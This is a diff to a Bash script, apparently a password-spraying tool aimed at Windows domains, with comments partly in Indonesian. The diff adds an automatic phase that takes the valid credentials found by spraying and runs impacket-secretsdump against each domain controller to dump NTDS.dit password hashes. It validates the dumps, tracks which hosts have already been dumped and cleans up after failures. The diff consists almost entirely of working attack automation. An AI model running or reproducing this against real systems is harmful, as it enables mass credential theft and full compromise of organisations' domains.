@@ -32,7 +32,7 @@ mkdir -p "$OUTDIR" "$SPIDER_DIR"
 : > "$USER_EXPORT_OUT"
 
 echo -e "${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] Spray Engine Auth Paralel${NC}"
+echo -e "${GREEN}[+] Spray Engine Auth Paralel (Be Careful!)${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
 for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
@@ -409,7 +409,7 @@ fi
 # =================================================================
 # EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
 # =================================================================
-FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_$DOMAIN.txt"
+FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_all.txt"
 : > "$FINAL_CREDS_FILE"
 
 if [[ -s "$FINAL_OUT" ]]; then
@@ -426,6 +426,73 @@ if [[ -s "$FINAL_OUT" ]]; then
         cat "$FINAL_CREDS_FILE"
         echo -e "${GRAY}------------------------------------------------------------${NC}"
     fi
+fi
+
+#====================================================
+# PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
+#====================================================
+if [[ -s "$FINAL_CREDS_FILE" ]]; then
+    
+    # File temporary untuk mencatat IP DC yang SUDAH BERHASIL di-dump
+    DUMPED_IPS_TRACKER="$OUTDIR/.dumped_ips.tmp"
+    : > "$DUMPED_IPS_TRACKER"
+    
+    while IFS=; read -r cred_line || [[ -n "$cred_line" ]]; do
+        [[ -z "$cred_line" ]] && continue
+        
+        # Ekstraksi komponen kredensial
+        ip=$(echo "$cred_line" | cut -d';' -f1)
+        user_pass=$(echo "$cred_line" | cut -d';' -f2)
+        cred_user=$(echo "$user_pass" | cut -d':' -f1)
+        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
+        
+        # -----------------------------------------------------------
+        # MASALAH 2 FIX: Cek apakah IP ini sudah sukses di-dump sebelumnya
+        # -----------------------------------------------------------
+        if grep -q "^$ip$" "$DUMPED_IPS_TRACKER" 2>/dev/null; then
+            echo -e "${GRAY}[*] Skipping $ip using $cred_user - NTDS already successfully dumped for this host.${NC}"
+            continue
+        fi
+        
+        DOMAIN=$(get_domain "$ip")
+        [[ "$DOMAIN" == "." ]] && DOMAIN="WORKGROUP"
+        
+        echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $ip using $cred_user...${NC}"
+        
+        dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"
+        
+        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$DOMAIN/$cred_user:$cred_pass@$ip\" -outputfile \"$dump_out_name\"${NC}"
+        echo -e "${BLUE}--- SECRETSDUMP LIVE OUTPUT ---${NC}"
+        
+        # Eksekusi live dengan tee
+        timeout 120s impacket-secretsdump -just-dc "$DOMAIN/$cred_user:$cred_pass@$ip" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+        
+        echo -e "${BLUE}-------------------------------${NC}"
+        
+        # -----------------------------------------------------------
+        # Validasi Keberhasilan Dump secara Akurat
+        # -----------------------------------------------------------
+        # Impacket menghasilkan file dengan akhiran .ntds. 
+        # Kita cek apakah file ada, tidak kosong, DAN mengandung struktur hash NTLM (seperti :::)
+        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
+            echo -e "${GREEN}[+++] SUCCESS! Domain hashes dumped successfully from $ip${NC}"
+            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
+            
+            # Catat IP ini ke tracker agar tidak di-dump ulang oleh user lain
+            echo "$ip" >> "$DUMPED_IPS_TRACKER"
+        else
+            echo -e "${RED}[-] Failed to dump NTDS from $ip using $cred_user (Access Denied / DRSUAPI Error)${NC}"
+            echo -e "${GRAY}[DEBUG] Full log history saved in $OUTDIR/secretsdump_run.log${NC}"
+            
+            # Membersihkan file sampah/kosong hasil generate impacket yang gagal
+            rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
+        fi
+        echo "------------------------------------------------------------"
+        
+    done < "$FINAL_CREDS_FILE"
+    
+    # Hapus file tracker setelah selesai phase 5
+    rm -f "$DUMPED_IPS_TRACKER"
 fi
 
 if [[ -s "$BROKEN_PIPE_LOG" ]]; then
